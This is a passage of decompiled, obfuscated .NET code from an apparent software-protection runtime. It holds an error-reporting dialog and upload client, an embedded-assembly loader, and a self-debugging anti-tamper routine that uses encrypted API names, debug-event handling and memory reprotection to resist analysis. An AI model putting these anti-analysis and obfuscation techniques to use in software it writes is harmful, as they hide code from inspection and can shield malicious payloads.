				IL_006c:
				registryKey.Close();
				break;
				IL_0043:
				registryKey = Registry.LocalMachine.OpenSubKey(Class30.WowSubkeyApplication);
				goto IL_0053;
				continue;
				end_IL_003d:
				break;
			}
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_65(string string_0, string string_1, string string_2, Delegate21 delegate21_0, byte[] byte_0, Class56 class56_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class56_0.string_2);
			if (class56_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class56_0.iwebProxy_0);
			}
			delegate21_0(reportingService.UploadReport2(class56_0.string_1, byte_0, string_0, string_1, string_2));
		}
		catch (Exception ex)
		{
			delegate21_0("ERR 2002: " + ex.Message);
		}
	}

	static void smethod_66()
	{
		try
		{
			Class27.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_67(Class45 class45_0, Class45.Struct22 struct22_0)
	{
		string key = default(string);
		if (v2IJBhvCyRSyXwG8iyi())
		{
			switch (3)
			{
			case 0:
			case 3:
				key = struct22_0.struct21_0.string_0.ToUpper();
				break;
			case 1:
				break;
			case 2:
			case 5:
				goto IL_006b;
			default:
				goto IL_007d;
			case 6:
				goto IL_008a;
			}
		}
		if (class45_0.dictionary_3.ContainsKey(key))
		{
			return class45_0.dictionary_3[key];
		}
		int count = class45_0.list_2.Count;
		goto IL_006b;
		IL_007d:
		class45_0.dictionary_3.Add(key, count);
		goto IL_008a;
		IL_008a:
		return count;
		IL_006b:
		class45_0.list_2.Add(struct22_0.struct21_0);
		goto IL_007d;
	}

	static Type smethod_68(Class49 class49_0)
	{
		return class49_0.type_0;
	}

	static void smethod_69(Delegate21 delegate21_0, Class56 class56_0)
	{
		if (class56_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class56_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class56_0.iwebProxy_0);
				}
				class56_0.string_2 = uploadReportLoginService.GetServerURL(class56_0.string_1);
				if (class56_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class56_0.string_2 == "ditto")
				{
					class56_0.string_2 = Class56.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate21_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate21_0(class56_0.string_2.StartsWith("ERR") ? class56_0.string_2 : "OK");
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static void smethod_70(IWebProxy iwebProxy_0, Class56 class56_0)
	{
		class56_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_71(Class31.Class34 class34_0)
	{
		int num = 0;
		class34_0.int_0 = 0;
		class34_0.int_1 = 0;
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_72(Class54 class54_0)
	{
		if (class54_0 != null)
		{
			Class54.class54_0 = class54_0;
			AppDomain.CurrentDomain.UnhandledException += class54_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class54_0.method_0);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_73(uint uint_0, int int_0, Class20.Struct0 struct0_0)
	{
		Class20.Delegate11 @delegate = Class17.smethod_1<Class20.Delegate11>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("IZRPfMpaEgyR6ZDyXnOYiJx08Wzx4ZAZWC/PdMnfamo="));
		Class20.Delegate12 delegate2 = Class17.smethod_1<Class20.Delegate12>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("8E4kyZwlQ3AJzMDUyZVD4tOSfAQxWsmg1leG/X3uOQo="));
		Class20.Delegate13 delegate3 = Class17.smethod_1<Class20.Delegate13>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("zyY3vUJrmonBTUubJ9UCC5TzDHj71hXOJ3SGrrAKtvU="));
		Class20.Delegate14 delegate4 = Class17.smethod_1<Class20.Delegate14>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("WNauUailUhceWvNacXsoZYxTSn28xUnXdaZLyAiTtuU="));
		Class20.Delegate2 delegate5 = Class17.smethod_1<Class20.Delegate2>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("w0qEzcCa4McG97qE1cgACdQlprmDa117VKUX1amgZAo="));
		Class20.Delegate10 delegate6 = Class17.smethod_1<Class20.Delegate10>(Class58.smethod_94("pdd3zZ5lwXtj8hV1GKRfVw=="), Class58.smethod_94("qt4tHmTORXFlu08c+szp/A=="));
		checked
		{
			if (!@delegate((int)struct0_0.uint_0))
			{
				throw new Exception();
			}
			delegate3(KillOnExit: false);
			uint lpflOldProtect = 64u;
			bool flag = true;
			while (true)
			{
				if (flag)
				{
					Class20.Struct2 lpDebugEvent = default(Class20.Struct2);
					if (!delegate2(out lpDebugEvent, -1))
					{
						break;
					}
					switch (lpDebugEvent.enum1_0)
					{
					case Class20.Enum1.const_2:
						if (lpDebugEvent.Exception.struct5_0.uint_0 == 2147483649u)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX REPROTECT FAILED");
							}
							break;
						}
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_027a;
					case Class20.Enum1.const_0:
						try
						{
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED");
							}
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED");
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED2");
							}
							ProjectData.ClearProjectError();
						}
						if (delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
						{
							uint SuspendCount = 0u;
							if (delegate6(struct0_0.intptr_1, out SuspendCount) != -1)
							{
								Thread.Sleep(1000);
								delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
								goto IL_027a;
							}
							throw new Exception("THREAD RESUME FAILED");
						}
						throw new Exception("VPEX FIRST FAILED2");
					default:
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_027a;
					case Class20.Enum1.const_3:
						{
							flag = false;
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
							goto IL_027a;
						}
						IL_027a:
						GC.Collect();
						break;
					}
					continue;
				}
				try
				{
					Process.GetProcessById((int)struct0_0.uint_0).Kill();
					Process.GetCurrentProcess().Kill();
					return;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
					return;
				}
			}
			throw new Exception();
		}
	}

	[DllImport("kernel32.dll")]
	internal static extern void GetSystemInfo(ref Class57.Struct25 struct25_0);

	static int smethod_74(int int_0, Font font_0, Graphics graphics_0, string string_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static Assembly smethod_75(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class25.Struct13 @struct = new Class25.Struct13(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2EzZjgxY2NkLTQzYmMtNDJkMC1iYWMzLTg2ZDNmMzRmOTU5M30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c33a1c73-85eb-4416-944d-1bb6853b5e9c},e2EzZjgxY2NkLTQzYmMtNDJkMC1iYWMzLTg2ZDNmMzRmOTU5M30=,[z]{c33a1c73-85eb-4416-944d-1bb6853b5e9c}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class25.dictionary_0)
			{
				if (Class25.dictionary_0.ContainsKey(text2))
				{
					result = Class25.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_0265;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class58.smethod_11(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								MoveFileEx(text5, null, 4);
								MoveFileEx(text4, null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class25.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_0265;
		IL_0265:
		return null;
	}

	static void smethod_76(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class58.smethod_19(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_77(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class58.smethod_19(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static void smethod_78(Form0 form0_0)
	{
		//IL_042d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0437: Expected O, but got Unknown
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_0742: Expected O, but got Unknown
		//IL_0743: Unknown result type (might be due to invalid IL or missing references)
		//IL_074d: Expected O, but got Unknown
		//IL_0759: Unknown result type (might be due to invalid IL or missing references)
		//IL_0763: Expected O, but got Unknown
		//IL_0764: Unknown result type (might be due to invalid IL or missing references)
		//IL_076e: Expected O, but got Unknown
		//IL_077a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0784: Expected O, but got Unknown
		//IL_0e5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e65: Expected O, but got Unknown
		//IL_0e66: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e70: Expected O, but got Unknown
		//IL_113e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1148: Expected O, but got Unknown
		//IL_1149: Unknown result type (might be due to invalid IL or missing references)
		//IL_1153: Expected O, but got Unknown
		//IL_116a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1174: Expected O, but got Unknown
		//IL_1175: Unknown result type (might be due to invalid IL or missing references)
		//IL_117f: Expected O, but got Unknown
		//IL_1180: Unknown result type (might be due to invalid IL or missing references)
		//IL_118a: Expected O, but got Unknown
		//IL_118b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1195: Expected O, but got Unknown
		//IL_1196: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a0: Expected O, but got Unknown
		//IL_1328: Unknown result type (might be due to invalid IL or missing references)
		//IL_1332: Expected O, but got Unknown
		//IL_1333: Unknown result type (might be due to invalid IL or missing references)
		//IL_133d: Expected O, but got Unknown
		//IL_133e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1348: Expected O, but got Unknown
		//IL_1349: Unknown result type (might be due to invalid IL or missing references)
		//IL_1353: Expected O, but got Unknown
		//IL_1369: Unknown result type (might be due to invalid IL or missing references)
		//IL_1373: Expected O, but got Unknown
		while (true)
		{
			form0_0.panel_0 = new Panel();
			while (true)
			{
				IL_1327:
				form0_0.button_5 = new Button();
				form0_0.checkBox_0 = new CheckBox();
				form0_0.label_0 = new Label();
				form0_0.button_0 = new Button();
				int num = 5;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0ab4;
				}
				goto IL_1201;
				IL_1201:
				while (true)
				{
					switch (num)
					{
					case 69:
						break;
					case 64:
						goto IL_0020;
					default:
						goto IL_00ba;
					case 12:
						goto IL_01df;
					case 15:
						goto IL_0244;
					case 47:
						goto IL_029a;
					case 11:
						goto IL_02b7;
					case 25:
						goto IL_0316;
					case 24:
						goto IL_033a;
					case 16:
						goto IL_0386;
					case 3:
						goto IL_03b6;
					case 9:
						goto IL_03da;
					case 48:
						goto IL_03ea;
					case 56:
						goto IL_047f;
					case 68:
						goto IL_04c2;
					case 31:
						goto IL_04d2;
					case 19:
						goto IL_04e6;
					case 33:
						goto IL_0519;
					case 65:
						goto IL_054c;
					case 53:
						goto IL_05a4;
					case 57:
						goto IL_05bd;
					case 42:
						goto IL_05fb;
					case 13:
						goto IL_0631;
					case 61:
						goto IL_064d;
					case 41:
						goto IL_0659;
					case 17:
						goto IL_0687;
					case 28:
						goto IL_06b6;
					case 20:
						goto IL_071a;
					case 59:
						goto IL_0737;
					case 43:
						goto IL_0784;
					case 18:
						goto IL_0871;
					case 14:
						goto IL_0883;
					case 58:
						goto IL_0893;
					case 67:
						goto IL_08ee;
					case 50:
						goto IL_097e;
					case 1:
						goto IL_098b;
					case 66:
						((Control)form0_0.control3_0).set_Size(new Size(250, 42));
						((Control)form0_0.control3_0).set_TabIndex(11);
						((Control)form0_0.control3_0).set_TabStop(false);
						num = 0;
						if (IwxRFxvB9dB3g1fRikX())
						{
						}
						continue;
					case 63:
						((Control)form0_0.control0_3).set_TabIndex(21);
						goto case 46;
					case 46:
						((Control)form0_0.control0_3).set_TabStop(false);
						((Control)form0_0.control0_3).set_Text("Error reporting completed. Thank you.");
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_3);
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.checkBox_1);
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.textBox_0);
						goto case 8;
					case 8:
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.control1_2);
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_2);
						((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.button_6);
						((Control)form0_0.panel_2).set_Location(new Point(11, 512));
						((Control)form0_0.panel_2).set_Name("panelEmail");
						goto IL_0ab4;
					case 30:
						goto IL_0ab4;
					case 52:
					case 55:
						goto IL_0b2d;
					case 26:
						goto IL_0b4a;
					case 2:
						goto IL_0ccc;
					case 7:
						goto IL_0cfc;
					case 23:
						goto IL_0d20;
					case 60:
						goto IL_0d30;
					case 21:
						goto IL_0d3d;
					case 54:
						goto IL_0d7f;
					case 27:
					case 62:
						goto IL_0da0;
					case 49:
						form0_0.control0_0 = new Control0();
						form0_0.control0_1 = new Control0();
						form0_0.control0_2 = new Control0();
						form0_0.control0_3 = new Control0();
						form0_0.panel_2 = new Panel();
						form0_0.label_3 = new Label();
						goto IL_0737;
					case 45:
						form0_0.control1_1.IconState = Enum5.const_1;
						form0_0.control1_1.Image = null;
						((Control)form0_0.control1_1).set_Location(new Point(0, 0));
						goto case 40;
					case 40:
						((Control)form0_0.control1_1).set_Name("headerControl2");
						((Control)form0_0.control1_1).set_Size(new Size(413, 58));
						((Control)form0_0.control1_1).set_TabIndex(24);
						((Control)form0_0.control1_1).set_TabStop(false);
						goto case 22;
					case 22:
						((Control)form0_0.control1_1).set_Text("Please wait while %AppName% is sending the report to %CompanyName% through the Internet.");
						((Control)form0_0.control0_0).set_Location(new Point(24, 72));
						((Control)form0_0.control0_0).set_Name("preparingFeedback");
						((Control)form0_0.control0_0).set_Size(new Size(368, 16));
						((Control)form0_0.control0_0).set_TabIndex(18);
						((Control)form0_0.control0_0).set_TabStop(false);
						((Control)form0_0.control0_0).set_Text("Preparing the error report.");
						((Control)form0_0.control0_1).set_Location(new Point(24, 96));
						((Control)form0_0.control0_1).set_Name("connectingFeedback");
						((Control)form0_0.control0_1).set_Size(new Size(368, 16));
						((Control)form0_0.control0_1).set_TabIndex(19);
						((Control)form0_0.control0_1).set_TabStop(false);
						((Control)form0_0.control0_1).set_Text("Connecting to server.");
						((Control)form0_0.control0_2).set_Location(new Point(24, 120));
						((Control)form0_0.control0_2).set_Name("transferingFeedback");
						((Control)form0_0.control0_2).set_Size(new Size(368, 16));
						((Control)form0_0.control0_2).set_TabIndex(20);
						((Control)form0_0.control0_2).set_TabStop(false);
						goto case 37;
					case 37:
						((Control)form0_0.control0_2).set_Text("Transferring report.");
						((Control)form0_0.control0_3).set_Location(new Point(24, 144));
						((Control)form0_0.control0_3).set_Name("completedFeedback");
						((Control)form0_0.control0_3).set_Size(new Size(368, 16));
						goto case 63;
					case 35:
						((Control)form0_0.class53_0).set_Text("errorMessage");
						((Label)form0_0.class53_0).set_UseMnemonic(false);
						goto IL_097e;
					case 34:
						((Control)form0_0.control1_2).set_TabStop(false);
						goto case 10;
					case 10:
						((Control)form0_0.control1_2).set_Text("Do you want to be contacted by %CompanyName% regarding this problem?");
						((Control)form0_0.label_2).set_Anchor((AnchorStyles)13);
						goto IL_0ccc;
					case 32:
						((Control)form0_0.button_4).set_Name("retrySending");
						((Control)form0_0.button_4).set_Size(new Size(80, 24));
						((Control)form0_0.button_4).set_TabIndex(23);
						((Control)form0_0.button_4).set_Text("&Retry");
						((Control)form0_0.button_4).set_Visible(false);
						((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_9);
						((Control)form0_0.control3_0).set_Location(new Point(87, 145));
						goto case 29;
					case 29:
						((Control)form0_0.control3_0).set_Name("waitSendingReport");
						goto case 66;
					case 5:
						form0_0.button_1 = new Button();
						form0_0.label_1 = new Label();
						form0_0.control1_0 = new Control1();
						form0_0.class53_0 = new Class53();
						form0_0.button_7 = new Button();
						form0_0.panel_1 = new Panel();
						form0_0.button_2 = new Button();
						form0_0.button_3 = new Button();
						form0_0.button_4 = new Button();
						form0_0.control3_0 = new Control3();
						form0_0.control1_1 = new Control1();
						goto case 49;
					case 0:
						((Control)form0_0.control3_0).set_Visible(false);
						((Control)form0_0.control1_1).set_BackColor(Color.FromArgb(36, 96, 179));
						((Control)form0_0.control1_1).set_Dock((DockStyle)1);
						((Control)form0_0.control1_1).set_ForeColor(Color.White);
						goto case 45;
					case 39:
						goto IL_1327;
					case 51:
						goto end_IL_1327;
					case 4:
						((Control)form0_0.button_8).set_Text("&Save Report");
						goto case 6;
					case 6:
						((Control)form0_0.button_8).set_Visible(false);
						((Control)form0_0.button_8).add_Click((EventHandler)form0_0.method_16);
						((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
						((Control)form0_0).set_BackColor(SystemColors.Window);
						((Form)form0_0).set_ClientSize(new Size(434, 768));
						((Form)form0_0).set_ControlBox(false);
						goto case 38;
					case 38:
						((Control)form0_0).get_Controls().Add((Control)(object)form0_0.control2_0);
						((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_2);
						((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_0);
						((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_1);
						goto case 44;
					case 44:
						((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
						((Control)form0_0).set_Name("ExceptionReportingForm");
						((Form)form0_0).set_ShowInTaskbar(false);
						((Form)form0_0).set_StartPosition((FormStartPosition)1);
						((Control)form0_0).set_Text("%AppName%");
						((Form)form0_0).set_TopMost(true);
						((Control)form0_0.panel_0).ResumeLayout(false);
						((Control)form0_0.panel_1).ResumeLayout(false);
						((Control)form0_0.panel_2).ResumeLayout(false);
						((Control)form0_0.panel_2).PerformLayout();
						((Control)form0_0).ResumeLayout(false);
						return;
					case 70:
						return;
					}
					break;
				}
				goto IL_0006;
				IL_0ab4:
				((Control)form0_0.panel_2).set_Size(new Size(413, 232));
				((Control)form0_0.panel_2).set_TabIndex(4);
				((Control)form0_0.panel_2).set_Visible(false);
				form0_0.label_3.set_FlatStyle((FlatStyle)3);
				((Control)form0_0.label_3).set_Location(new Point(20, 131));
				((Control)form0_0.label_3).set_Name("labelEmail");
				((Control)form0_0.label_3).set_Size(new Size(100, 16));
				goto IL_0b2d;
				IL_0b2d:
				((Control)form0_0.label_3).set_TabIndex(9);
				((Control)form0_0.label_3).set_Text("&Email address:");
				goto IL_0b4a;
				IL_0b4a:
				((ButtonBase)form0_0.checkBox_1).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.checkBox_1).set_Location(new Point(120, 160));
				((Control)form0_0.checkBox_1).set_Name("sendAnonymously");
				((Control)form0_0.checkBox_1).set_Size(new Size(232, 16));
				((Control)form0_0.checkBox_1).set_TabIndex(11);
				((Control)form0_0.checkBox_1).set_Text("I prefer to send this report &anonymously.");
				form0_0.checkBox_1.add_CheckedChanged((EventHandler)form0_0.method_14);
				((Control)form0_0.textBox_0).set_Location(new Point(120, 128));
				((Control)form0_0.textBox_0).set_Name("email");
				((Control)form0_0.textBox_0).set_Size(new Size(256, 20));
				((Control)form0_0.textBox_0).set_TabIndex(10);
				((Control)form0_0.textBox_0).add_TextChanged((EventHandler)form0_0.method_13);
				((Control)form0_0.control1_2).set_BackColor(Color.FromArgb(36, 96, 179));
				((Control)form0_0.control1_2).set_Dock((DockStyle)1);
				((Control)form0_0.control1_2).set_ForeColor(Color.White);
				form0_0.control1_2.IconState = Enum5.const_1;
				form0_0.control1_2.Image = null;
				((Control)form0_0.control1_2).set_Location(new Point(0, 0));
				((Control)form0_0.control1_2).set_Name("headerControl3");
				((Control)form0_0.control1_2).set_Size(new Size(413, 58));
				((Control)form0_0.control1_2).set_TabIndex(3);
				num = 34;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0ccc;
				}
				goto IL_1201;
				IL_0ccc:
				form0_0.label_2.set_FlatStyle((FlatStyle)3);
				((Control)form0_0.label_2).set_Location(new Point(20, 69));
				((Control)form0_0.label_2).set_Name("label3");
				goto IL_0cfc;
				IL_0cfc:
				((Control)form0_0.label_2).set_Size(new Size(381, 43));
				((Control)form0_0.label_2).set_TabIndex(10);
				goto IL_0d20;
				IL_0d20:
				((Control)form0_0.label_2).set_Text("If you want to be contacted by %CompanyName% regarding this error, please provide your e-mail address. This information will not be used for any other purpose.");
				goto IL_0d30;
				IL_0d30:
				((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
				goto IL_0d3d;
				IL_0d3d:
				((Control)form0_0.button_6).set_Enabled(false);
				((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_6).set_Location(new Point(295, 197));
				((Control)form0_0.button_6).set_Name("continueSendReport");
				goto IL_0d7f;
				IL_0d7f:
				((Control)form0_0.button_6).set_Size(new Size(105, 24));
				((Control)form0_0.button_6).set_TabIndex(12);
				goto IL_0da0;
				IL_0da0:
				((Control)form0_0.button_6).set_Text("&Send Error Report");
				((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
				((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
				((Control)form0_0.control2_0).set_Cursor(Cursors.get_Hand());
				((Control)form0_0.control2_0).set_Location(new Point(6, 730));
				((Control)form0_0.control2_0).set_Name("poweredBy");
				((Control)form0_0.control2_0).set_Size(new Size(112, 32));
				((Control)form0_0.control2_0).set_TabIndex(5);
				goto IL_08ee;
				IL_08ee:
				((Control)form0_0.control2_0).set_TabStop(false);
				((Control)form0_0.control2_0).set_Text("poweredBy1");
				((Control)form0_0.button_8).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_8).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_8).set_Location(new Point(146, 197));
				((Control)form0_0.button_8).set_Name("saveReport");
				((Control)form0_0.button_8).set_Size(new Size(80, 24));
				((Control)form0_0.button_8).set_TabIndex(25);
				num = 4;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_097e;
				}
				goto IL_1201;
				IL_097e:
				((Control)form0_0.button_7).set_Anchor((AnchorStyles)10);
				goto IL_098b;
				IL_098b:
				((ButtonBase)form0_0.button_7).set_FlatStyle((FlatStyle)3);
				goto IL_0006;
				IL_0006:
				((Control)form0_0.button_7).set_Location(new Point(136, 205));
				goto IL_0020;
				IL_0020:
				((Control)form0_0.button_7).set_Name("saveAsFile");
				((Control)form0_0.button_7).set_Size(new Size(72, 24));
				((Control)form0_0.button_7).set_TabIndex(11);
				((Control)form0_0.button_7).set_Text("Save as &File");
				((Control)form0_0.button_7).add_Click((EventHandler)form0_0.method_15);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_8);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_2);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_3);
				goto IL_00ba;
				IL_00ba:
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_4);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control3_0);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control1_1);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_0);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_1);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_2);
				((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_3);
				((Control)form0_0.panel_1).set_Location(new Point(8, 264));
				((Control)form0_0.panel_1).set_Name("panelSending");
				((Control)form0_0.panel_1).set_Size(new Size(413, 232));
				((Control)form0_0.panel_1).set_TabIndex(2);
				((Control)form0_0.panel_1).set_Visible(false);
				((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_2).set_Location(new Point(320, 197));
				goto IL_01df;
				IL_01df:
				((Control)form0_0.button_2).set_Name("cancelSending");
				((Control)form0_0.button_2).set_Size(new Size(80, 24));
				((Control)form0_0.button_2).set_TabIndex(10);
				((Control)form0_0.button_2).set_Text("&Cancel");
				((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_2);
				((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
				goto IL_0244;
				IL_0244:
				((Control)form0_0.button_3).set_Enabled(false);
				((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_3).set_Location(new Point(232, 197));
				((Control)form0_0.button_3).set_Name("ok");
				((Control)form0_0.button_3).set_Size(new Size(80, 24));
				goto IL_029a;
				IL_029a:
				((Control)form0_0.button_3).set_TabIndex(22);
				((Control)form0_0.button_3).set_Text("&OK");
				goto IL_02b7;
				IL_02b7:
				((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_3);
				((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_4).set_Location(new Point(144, 197));
				num = 32;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0893;
				}
				goto IL_1201;
				IL_0893:
				((Control)form0_0.panel_0).set_Size(new Size(413, 240));
				((Control)form0_0.panel_0).set_TabIndex(0);
				((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_5).set_Location(new Point(66, 205));
				goto IL_0316;
				IL_0316:
				((Control)form0_0.button_5).set_Name("debug");
				((Control)form0_0.button_5).set_Size(new Size(64, 24));
				goto IL_033a;
				IL_033a:
				((Control)form0_0.button_5).set_TabIndex(13);
				((Control)form0_0.button_5).set_Text("Debug");
				((Control)form0_0.button_5).set_Visible(false);
				((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_11);
				((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
				goto IL_0386;
				IL_0386:
				((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.checkBox_0).set_Location(new Point(22, 99));
				((Control)form0_0.checkBox_0).set_Name("continueCheckBox");
				goto IL_03b6;
				IL_03b6:
				((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
				((Control)form0_0.checkBox_0).set_TabIndex(14);
				goto IL_03da;
				IL_03da:
				((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
				goto IL_03ea;
				IL_03ea:
				form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_4);
				((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
